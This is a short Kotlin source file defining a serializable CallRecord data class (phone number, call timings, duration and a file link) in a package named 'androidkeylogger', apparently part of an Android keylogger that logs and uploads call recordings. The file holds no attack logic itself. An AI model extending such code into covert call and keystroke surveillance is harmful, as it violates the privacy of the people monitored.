package com.azamovhudstc.androidkeylogger.model

import kotlinx.serialization.Serializable

@Serializable
data class CallRecord(
    val phoneNumber: String,
    val startTimeMillis: String,
    val endTimeMillis: String,
    val durationMillis: String,
    val fileLink: String
)